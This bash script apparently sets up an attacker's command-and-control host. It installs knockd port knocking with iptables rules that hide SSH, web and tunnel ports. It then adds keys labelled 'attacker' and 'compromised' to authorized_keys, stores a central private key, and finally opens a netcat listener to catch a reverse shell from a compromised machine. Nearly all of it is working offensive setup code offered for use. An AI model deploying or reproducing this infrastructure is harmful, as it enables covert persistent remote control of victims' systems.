#!/bin/bash

set -euo pipefail

########################################################################
########################### KNOCKD SETUP ###############################
########################################################################
sudo apt-get install -y knockd
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y iptables-persistent

# Don't block current ssh access
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j REJECT
sudo iptables -A INPUT -p tcp --dport 80 -j REJECT
sudo iptables -A INPUT -p tcp --dport 443 -j REJECT
sudo iptables -A INPUT -p tcp --dport $SERVER_TUNNEL_PORT -j REJECT

sudo systemctl enable netfilter-persistent
sudo systemctl start netfilter-persistent
sudo netfilter-persistent save
sudo netfilter-persistent reload

echo "$KNOCKD_CONF" > /etc/knockd.conf
echo "$KNOCKD_CONF2" > /etc/default/knockd

sudo systemctl enable knockd
sudo systemctl start knockd


########################################################################
###################### ATTACKER SSH SETUP ##############################
########################################################################
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "$ATTACKER_PUBLIC_KEY" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

########################################################################
###################### COMPROMISED SSH SETUP ##############################
########################################################################
echo "$COMPROMISED_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

########################################################################
####################### SERVER SSH SETUP ###############################
########################################################################
echo "$SERVER_PUBLIC_KEY" > ~/.ssh/CENTRAL.pub
echo "$SERVER_PRIVATE_KEY" > ~/.ssh/CENTRAL

echo "All done. If this is your first time, reboot. Otherwise, here is the reverse shell:"

########################################################################
####################### REVERSE SHELL SETUP ###############################
########################################################################
nc -lvp $SERVER_TUNNEL_PORT  



